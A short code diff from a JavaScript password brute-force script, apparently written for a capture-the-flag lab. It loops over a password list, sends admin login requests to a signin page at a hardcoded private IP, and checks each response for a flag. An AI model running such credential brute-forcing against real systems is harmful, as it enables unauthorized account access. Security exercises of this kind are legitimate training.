@@ -55,7 +55,7 @@ const bruteforcePasswords = [
 // Brute force function
 const bruteForce = async () => {
   for (let i = 0; i < bruteforcePasswords.length; i++) {
-    const urlBase = `${process.env.URL_BASE}/?page=signin&username=admin&password=${bruteforcePasswords[i]}&Login=Login#`;
+    const urlBase = `http://10.11.100.150/?page=signin&username=admin&password=${bruteforcePasswords[i]}&Login=Login#`;
     await axios.get(urlBase).then((response) => {
       if (response.status === 200) {
         if (response.data.includes("flag")) {
